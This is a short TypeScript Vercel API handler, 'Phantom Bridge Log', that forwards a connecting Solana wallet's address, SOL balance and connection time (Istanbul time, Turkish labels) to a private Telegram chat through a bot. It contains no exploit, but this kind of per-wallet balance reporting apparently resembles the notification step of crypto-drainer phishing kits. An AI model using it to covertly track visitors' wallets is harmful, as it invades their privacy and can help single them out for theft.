// /api/tg-log.ts
import type { VercelRequest, VercelResponse } from "@vercel/node";

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "Only POST" });
  }

  try {
    const { address, solBalance, connectedAtISO } = req.body || {};

    // İstanbul saatine çevir
    const connectedTR = new Intl.DateTimeFormat("tr-TR", {
      timeZone: "Europe/Istanbul",
      dateStyle: "short",
      timeStyle: "medium",
    }).format(new Date(connectedAtISO || Date.now()));

    const text =
      `🔗 <b>Phantom Bridge Log</b>\n` +
      `👛 <b>Cüzdan:</b> <code>${address}</code>\n` +
      `⏰ <b>Zaman (TR):</b> ${connectedTR}\n` +
      `💰 <b>SOL:</b> ${solBalance}`;

    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const tg = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    if (!tg.ok) {
      const err = await tg.text();
      console.error("Telegram error:", err);
      return res.status(500).json({ ok: false, error: "Telegram failed" });
    }

    return res.status(200).json({ ok: true });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ ok: false });
  }
}
